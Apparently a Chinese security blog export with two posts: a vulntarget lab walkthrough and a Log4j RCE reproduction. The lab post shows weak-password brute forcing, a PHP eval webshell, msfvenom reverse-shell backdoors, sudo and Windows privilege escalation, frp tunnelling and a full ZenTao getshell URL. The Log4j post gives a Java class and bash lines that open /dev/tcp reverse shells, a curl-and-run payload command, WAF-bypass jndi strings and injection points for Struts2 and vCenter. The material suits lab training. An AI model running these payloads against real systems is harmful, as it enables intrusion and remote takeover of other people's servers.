        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>此靶场来自于星期五实验室 微信号: Friday_LAB</p></blockquote><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>百度云链接: <a href="https://pan.baidu.com/s/1Hdqkojmu-CeIuPr2gLWHwA">https://pan.baidu.com/s/1Hdqkojmu-CeIuPr2gLWHwA</a> 提取码:s4ka</p><p>Github：<a href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p><h2 id="信息收集-—-外网打点"><a href="#信息收集-—-外网打点" class="headerlink" title="信息收集 — 外网打点"></a>信息收集 — 外网打点</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sV -v -Pn 192.168.189.146</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682742/Xnip2021-12-28_17-09-55_ew5ggh.png"></p><h3 id="8888-端口"><a href="#8888-端口" class="headerlink" title="8888 端口"></a>8888 端口</h3><p>8888 端口是宝塔面板，不知道安全入口路径，作罢</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682756/Xnip2021-12-28_17-10-12_pglkkh.png"></p><h3 id="80-端口"><a href="#80-端口" class="headerlink" title="80 端口"></a>80 端口</h3><p>80 端口上是一个宝塔的默认页面</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682770/Xnip2021-12-28_17-10-31_byzwiy.png"></p><h3 id="81-端口"><a href="#81-端口" class="headerlink" title="81 端口"></a>81 端口</h3><p>81 端口是极致 cms</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682772/Xnip2021-12-28_17-10-48_r3pr0r.png"></p><p>888 端口没服务，21、22、3306 会不会存在弱口令之后再说，根据以上信息，看起来 81 端口上的极致 cms 比较好欺负一点。先从极致 cms 这里突破吧</p><h2 id="CMS-后台地址泄露"><a href="#CMS-后台地址泄露" class="headerlink" title="CMS 后台地址泄露"></a>CMS 后台地址泄露</h2><p>像这种 cms 一般都有后台，用工具扫一下目录就能得到后台地址</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682773/Xnip2021-12-28_17-11-41_xz5bvb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.146:81/admin.php/Login/index.html</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640682846/Xnip2021-12-28_17-13-57_zvbkld.png"></p><h2 id="验证码复用-amp-后台弱口令"><a href="#验证码复用-amp-后台弱口令" class="headerlink" title="验证码复用 &amp; 后台弱口令"></a>验证码复用 &amp; 后台弱口令</h2><p>后台验证码存在复用问题，上 burp 测一波弱口令</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683102/Xnip2021-12-28_17-15-21_ngmnkw.png"></p><p>当密码为 admin123 时，返回包中 msg 信息 code&#x3D;0，其它包都是 code&#x3D;1，那么推测 admin123 就是正确密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683103/Xnip2021-12-28_17-18-05_bok8kx.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">极致cms后台账户密码admin/admin123</span><br></pre></td></tr></table></figure><p>使用 admin&#x2F;admin123 登录后台</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683158/Xnip2021-12-28_17-19-08_bgr42p.png"></p><h2 id="后台插件-getshell"><a href="#后台插件-getshell" class="headerlink" title="后台插件 getshell"></a>后台插件 getshell</h2><p>搜索一下这个插件</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683605/Xnip2021-12-28_17-24-28_odc6ib.png"></p><p>点击安装</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683639/Xnip2021-12-28_17-24-51_ikee1q.png"></p><p>点击配置</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683645/Xnip2021-12-28_17-25-25_ibfz8q.png"></p><p>设置一个密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640683704/Xnip2021-12-28_17-25-37_jzo7lf.png"></p><p>再次输入密码之后立即提交即可进入在线编辑器，这里可以对网站源码进行修改</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640684332/Xnip2021-12-28_17-36-10_wyzexg.png"></p><p>写个一句话到 index.php 文件中</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640684340/Xnip2021-12-28_17-35-42_et4wgo.png"></p><p>蚁剑连接</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640684437/Xnip2021-12-28_17-40-28_if07qy.png"></p><p>执行命令发现返回 ret&#x3D;127，应该是宝塔禁用了执行命令的函数</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685185/Xnip2021-12-28_17-52-47_pqu0lp.png"></p><h2 id="绕过-disable-functions"><a href="#绕过-disable-functions" class="headerlink" title="绕过 disable_functions"></a>绕过 disable_functions</h2><p>使用蚁剑自带的插件进行 bypass</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685200/Xnip2021-12-28_17-51-45_aaasrz.png"></p><p>环境变量好像有点问题，执行命令需要加 &#x2F;sbin 去执行</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685201/Xnip2021-12-28_17-52-17_qsljxb.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp  lhost=192.168.189.133 LPORT=6666 -f elf &gt; backdoor.elf</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685872/Xnip2021-12-28_18-04-20_qmpssd.png"></p><p>通过蚁剑上传</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640685930/Xnip2021-12-28_18-05-13_omwbam.png"></p><p>msf 配置监听</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686120/Xnip2021-12-28_18-06-09_ltevzi.png"></p><p>执行 backdoor.elf 后门文件</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686154/Xnip2021-12-28_18-07-49_llces3.png"></p><p>msf 获得会话</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686156/Xnip2021-12-28_18-08-12_wwz8cl.png"></p><p>使用 msf 自带的提权辅助模块进行扫描，扫描完之后会给出可用的提权建议<img src="https://res.cloudinary.com/lin1109/image/upload/v1640686622/Xnip2021-12-28_18-11-15_nedlax.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.189.146 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.189.146 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.189.146 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br></pre></td></tr></table></figure><p>一个一个挨个试….</p><p>exploit&#x2F;linux&#x2F;local&#x2F;network_manager_vpnc_username_priv_esc 失败</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686687/Xnip2021-12-28_18-15-18_m3wirs.png"></p><p>exploit&#x2F;linux&#x2F;local&#x2F;ptrace_traceme_pkexec_helper 失败</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686702/Xnip2021-12-28_18-15-32_u2grzf.png"></p><p>exploit&#x2F;linux&#x2F;local&#x2F;sudo_baron_samedit 成功</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640686848/Xnip2021-12-28_18-20-31_evbq9d.png"></p><p>上面 msf 提权的时候自动创建了一个账户 msf&#x2F;lwxxbhykmkauzty，使用这个账户登录之后是 root 权限</p><h2 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h2><p>双网卡，存在另外一个网段</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640759464/Xnip2021-12-29_14-23-05_eym53d.png"></p><p>使用 fscan 扫一下内网，别问我为啥用 fscan，我是脚本小子，当然也可以用 msf、nmap 扫，但是 fscan 个人认为来的更方便</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640759473/Xnip2021-12-29_14-31-08_nnrxn5.png"></p><p>扫描结果存在 res.txt 中，emmmm ssh 密码被爆出来了 root&#x2F;root，现实情况肯定没这么好的事情</p><p>内网有一台存活主机 192.168.112.128 VULNTARGET\WIN10 并且开放了 8080 端口，fscan 显示为禅道</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640760659/Xnip2021-12-29_14-50-42_fj3arx.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.112.129:888 open</span><br><span class="line">192.168.112.129:8888 open</span><br><span class="line">192.168.112.129:3306 open</span><br><span class="line">192.168.112.128:3306 open</span><br><span class="line">192.168.112.128:139 open</span><br><span class="line">192.168.112.128:135 open</span><br><span class="line">192.168.112.129:81 open</span><br><span class="line">192.168.112.129:22 open</span><br><span class="line">192.168.112.129:21 open</span><br><span class="line">192.168.112.129:80 open</span><br><span class="line">192.168.112.128:445 open</span><br><span class="line">192.168.112.128:8080 open</span><br><span class="line">[*] WebTitle:http://192.168.112.129:8888 code:302 len:219    title:Redirecting...</span><br><span class="line">[*] WebTitle:http://192.168.112.129:888 code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://192.168.112.129    code:200 len:18     title:没有找到站点</span><br><span class="line">[*] 192.168.112.128      VULNTARGET\WIN10             </span><br><span class="line">[*] WebTitle:http://192.168.112.129:8888/login code:200 len:24     title:安全入口校验失败</span><br><span class="line">[*] WebTitle:http://192.168.112.129:81 code:200 len:21     title:极致CMS建站系统</span><br><span class="line">[+] 192.168.112.128 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[+] InfoScan:http://192.168.112.129:8888/login [宝塔-BT.cn] </span><br><span class="line">[*] WebTitle:http://192.168.112.128:8080 code:200 len:141    title:None</span><br><span class="line">[+] InfoScan:http://192.168.112.128:8080 [禅道] </span><br><span class="line">[+] SSH:192.168.112.129:22:root root</span><br></pre></td></tr></table></figure><h3 id="frp-内网穿透"><a href="#frp-内网穿透" class="headerlink" title="frp 内网穿透"></a>frp 内网穿透</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip = 192.168.189.133</span><br><span class="line">bind_port = 7777</span><br></pre></td></tr></table></figure><p>启动 frps</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640761374/Xnip2021-12-29_15-02-43_gsagsp.png"></p><p>frpc 配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.189.133</span><br><span class="line">server_port = 7777</span><br><span class="line"></span><br><span class="line">[socks_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 8888</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p>启动 frpc （这里普通用户也有权限启动，不需要 root）</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640761346/Xnip2021-12-29_15-01-40_pihhyu.png"></p><p>Chrome 配置代理</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640761444/Xnip2021-12-29_15-03-53_asqldx.png"></p><h3 id="内网禅道弱口令"><a href="#内网禅道弱口令" class="headerlink" title="内网禅道弱口令"></a>内网禅道弱口令</h3><p>成功访问到内网禅道</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640761591/Xnip2021-12-29_15-05-56_te9u2b.png"></p><p>burp 测一波弱口令</p><p>给 burp 设置 socks 代理</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640763789/Xnip2021-12-29_15-39-23_s8sbm1.png"></p><p>emmmm 密码加密传输的，不是 md5，手动弱口令吧</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640763790/Xnip2021-12-29_15-42-37_wyb0yr.png"></p><p>使用 admin&#x2F;Admin123 成功进入后台</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640763864/Xnip2021-12-29_15-44-15_izo19c.png"></p><h3 id="禅道-getshell"><a href="#禅道-getshell" class="headerlink" title="禅道 getshell"></a>禅道 getshell</h3><p>禅道版本为版本 12.4.2，去谷歌搜索一下，发现此版本存在漏洞，可以直接 getshell</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833078/Xnip2021-12-30_10-34-39_t7fehg.png"></p><blockquote><p>禅道 12.4.2 版本存在任意文件下载漏洞，该漏洞是因为 client 类中 download 方法中过滤不严谨可以使用 ftp 达成下载文件的目的。且下载文件存储目录可解析 php 文件，造成 getshell</p><p>禅道 OA 12.4.2 中，因为 download 中的 downloadZipPackage 函数过滤不严谨，可以使用 ftp，HTTP 协议等绕过</p><p>具体可参考 <a href="https://www.secpulse.com/archives/146782.html">https://www.secpulse.com/archives/146782.html</a></p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>我们控制的那台 linux 是有 python 的，使用 python 开启一个简单的 web 服务，以便目标能访问并下载我们的 webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <span class="comment"># 使用python pty模块开启一个交互式shell环境</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833165/Xnip2021-12-30_10-59-17_hgfnyp.png"></p><p>由于禅道这台服务器不出网，因此只能利用第一层的 linux 这台服务器来下载 webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_REQUEST[&#x27;x&#x27;]); ?&gt; &quot;</span> &gt; backdoor.php  <span class="comment">#写一个一句话webshell</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8989 <span class="comment">#使用python开启一个简单的web服务</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833323/Xnip2021-12-30_11-01-48_yegdxn.png"></p><p>攻击 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://192.168.112.129:8989/backdoor.php</span><br></pre></td></tr></table></figure><p>使用 base64 加密一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SFRUUDovLzE5Mi4xNjguMTEyLjEyOTo4OTg5L2JhY2tkb29yLnBocA==</span><br></pre></td></tr></table></figure><p>完整 exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.112.128:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzE5Mi4xNjguMTEyLjEyOTo4OTg5L2JhY2tkb29yLnBocA==</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833670/Xnip2021-12-30_11-06-06_kmihww.png"></p><p>提示保存成功，访问一下 backdoor.php，文件存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.112.128:8080/data/client/1/backdoor.php</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833670/Xnip2021-12-30_11-07-41_njugrw.png"></p><p>蚁剑配置代理连接</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833835/Xnip2021-12-30_11-09-45_qv9jli.png"></p><p>是个低权限用户 iis apppool\zentao</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833836/Xnip2021-12-30_11-10-12_jze7eb.png"></p><p>上线 MSF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.112.129 lport=6767 -f exe &gt; /root/msfshell/backdoor.exe  <span class="comment">#生成windows后门</span></span><br></pre></td></tr></table></figure><p>设置监听，通过蚁剑上传后门文件执行获得会话</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640851677/Xnip2021-12-30_16-06-44_ztt91g.png"></p><p>添加路由，权限很低</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640851817/Xnip2021-12-30_16-09-38_yeiy5y.png"></p><p>使用 msf 提权建议模块尝试提权无果，手动查找可用提权 exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><p>查一下补丁状况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>windows 10 专业版</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640854894/Xnip2021-12-30_16-25-30_zjlac0.png"></p><p>提权辅助查询一下可用 exp，CVE-2021-1732 可用</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640855018/Xnip2021-12-30_17-03-10_uyiasu.png"></p><p>msf 提权成功</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640854896/Xnip2021-12-30_17-00-04_v4x1k9.png"></p><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640855302/Xnip2021-12-30_17-08-12_iqafva.png"></p><p>msf 会话一直掉，有时间再更。。。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j RCE简单复现</title>
      <link href="/posts/358775679/"/>
      <url>/posts/358775679/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原理分析在文章最后几个知名公众号里去看，分析的很好，开头一张图。</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1457_pmk2e2.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>根据网上公布的reverse shell Exp 进行利用</p><p>更换一下exp中的 ip 即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/12000 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>javac 编译一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.class</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205294/Xnip2021-12-11_14-46-44_vvmgih.png"></p><p>使用python启动一个简单的http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 11000</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205523/Xnip2021-12-11_14-51-42_qmn4m7.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205523/Xnip2021-12-11_14-51-51_ycxcup.png"></p><p>使用工具开启一个 RMI 和 LDAP 服务</p><p>工具地址：<a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://ip:11000/#Exp&quot;</span> 6666</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205750/Xnip2021-12-11_14-55-30_xgwmx0.png"></p><p>nc 监听 12000 端口</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206251/Xnip2021-12-11_15-03-42_u7jimd.png"></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>使用在线漏洞环境：<a href="http://d63bb2586.lab.aqlab.cn/">http://d63bb2586.lab.aqlab.cn/</a></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206349/Xnip2021-12-11_15-05-38_de7hpo.png"></p><h3 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h3><p>点击登录即可收到反弹的 shell</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206468/Xnip2021-12-11_15-07-30_polfii.png"></p><h2 id="使用JNDI注入测试工具攻击"><a href="#使用JNDI注入测试工具攻击" class="headerlink" title="使用JNDI注入测试工具攻击"></a>使用JNDI注入测试工具攻击</h2><p>作者github：<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>写一个反弹shell脚本，并使用python开启一个简单http服务以供目标下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/xxx.xxx.xxx.xxx/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p>使用JNDI-Injection-Exploit启动一个RMI服务器、LDAP服务器和HTTP服务器，并让目标下载上面制作的反弹shell的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;curl http://xxx.xxx.xxx.xxx/reserve.sh -o r.sh&quot;</span> -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323145740716.png" alt="image-20220323145740716"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323150714759.png" alt="image-20220323150714759"></p><p>让目标执行刚才下载的反弹shell的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;bash  r.sh&quot;</span> -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323150948377.png" alt="image-20220323150948377"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323150854328.png" alt="image-20220323150854328"></p><h3 id="Reverse-shell-1"><a href="#Reverse-shell-1" class="headerlink" title="Reverse shell"></a>Reverse shell</h3><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323151214415.png" alt="image-20220323151214415"></p><h2 id="绕过waf的一些poc"><a href="#绕过waf的一些poc" class="headerlink" title="绕过waf的一些poc"></a>绕过waf的一些poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://asdasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://asdasd.asdasd.asdasd/ass&#125;</span><br><span class="line">$&#123;jndi:rmi://adsasd.asdasd.asdasd&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxxxxxx.xx/poc&#125;</span><br></pre></td></tr></table></figure><h2 id="一些ldap或rmi利用工具"><a href="#一些ldap或rmi利用工具" class="headerlink" title="一些ldap或rmi利用工具"></a>一些ldap或rmi利用工具</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EmYiQing/LDAPKit</span><br><span class="line">https://github.com/feihong-cs/JNDIExploit</span><br><span class="line">https://github.com/veracode-research/rogue-jndi</span><br><span class="line">https://github.com/su18/JNDI</span><br><span class="line">https://github.com/0x727/JNDIExploit</span><br><span class="line">https://github.com/welk1n/JNDI-Injection-Exploit</span><br></pre></td></tr></table></figure><h2 id="log4j涉及的一些组件的位置"><a href="#log4j涉及的一些组件的位置" class="headerlink" title="log4j涉及的一些组件的位置"></a>log4j涉及的一些组件的位置</h2><h3 id="apache-struts2"><a href="#apache-struts2" class="headerlink" title="apache struts2"></a>apache struts2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/struts2-showcase/token/transfer4.action -d struts.token.name=&#x27;$&#123;jndi:rmi://127.0 .0.1:1099/ylbtsl&#125;</span><br><span class="line">http://localhost:8080/struts2-showcase/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/</span><br></pre></td></tr></table></figure><h3 id="VMWare-VCenter"><a href="#VMWare-VCenter" class="headerlink" title="VMWare VCenter"></a>VMWare VCenter</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: \$&#123;jndi:ldap://10.0.0.3:1270/lol&#125;&quot;  